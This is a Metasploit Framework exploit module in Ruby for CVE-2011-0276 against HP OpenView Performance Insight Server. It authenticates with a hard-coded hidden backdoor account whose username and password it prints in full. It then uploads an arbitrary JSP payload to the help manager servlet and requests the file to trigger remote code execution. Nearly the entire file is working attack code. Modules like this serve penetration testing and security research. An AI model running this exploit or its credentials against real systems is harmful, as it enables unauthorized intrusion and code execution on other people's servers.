##
# $Id: hp_openview_insight_backdoor.rb 11969 2011-03-15 21:56:11Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Performance Insight Server Backdoor Account Code Execution',
			'Description'    => %q{
					This module exploits a hidden account in the com.trinagy.security.XMLUserManager Java
				class. When using this account, an attacker can abuse the 
				com.trinagy.servlet.HelpManagerServlet class and write arbitary files to the system 
				allowing the execution of arbitary code.

				NOTE: This module has only been tested against HP OpenView Performance Insight Server 5.41.0
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11969 $',
			'Platform'       => 'win',
			'Privileged'     => true,
			'References'     =>
				[
					[ 'CVE', '2011-0276' ],
					[ 'OSVDB', '70754' ],
				],
			'Targets'        =>
				[
					[ 'Universal Windows Target',
						{
							'Arch'     => ARCH_JAVA,
							'Payload'  =>
								{
									'DisableNops' => true,
								},
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 31 2011'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('USERNAME', [ false, 'The username to authenticate as', 'hch908v' ]),
				OptString.new('PASSWORD', [ false, 'The password for the specified username', 'z6t0j$+i' ])
			], self.class )

	end

	def exploit

		creds = "#{datastore['USERNAME']}" + ":" + "#{datastore['PASSWORD']}"

		dir  = rand_text_alpha_upper(rand(8) + 1)
		page = rand_text_alpha_upper(8) + ".jsp"
		uid  = rand(20).to_s

		file =  "-----------------------------#{uid}\r\n"
		file << "Content-Disposition: form-data; name=\"filename\"; filename=\"#{page}\"\r\n"
		file << "Content-Type: application/x-java-archive\r\n\r\n"
		file << payload.encoded + "\r\n"
		file <<  "-----------------------------#{uid}\r\n"
		# if (p.getName().equals("location")); ...
		file << "Content-Disposition: form-data; name=\"location\"\r\n"
		file << "Content-Type: text/plain\r\n\r\n"
		file << dir + "\r\n"
		file << "-----------------------------#{uid}\r\n\r\n"

		print_status("Sending our POST request...")

		res = send_request_cgi(
			{
				'uri'		=> "/reports/helpmanager",
				'version'	=> '1.1',
				'method'	=> 'POST',
				'ctype'         => 'multipart/form-data; boundary=---------------------------' + uid,
				'data'		=> file,
				'headers'	=>
					{
=begin
this.internal = new User("hch908v");
this.internal.setName("hidden user");
this.internal.setEncryptedPassword(TrendCrypt.crypt("hch908v", "z6t0j$+i"));
this.internal.addRole("user");
this.internal.addRole("admin");
=end
						'Authorization' =>  "Basic #{Rex::Text.encode_base64(creds)}",

					}
			}, 5)
		
		if ( res and res.code == 200 )
			print_status("Login/Upload successful. Triggering payload at '/help/#{dir}/#{page}'...")
			send_request_raw({
					'uri'		=> "/help/#{dir}/#{page}",
					'method'	=> 'GET',
					'version'	=> '1.0',
			}, 5)

			handler
		else
			print_error("Login/Upload refused!")
			return
		end
	end
end
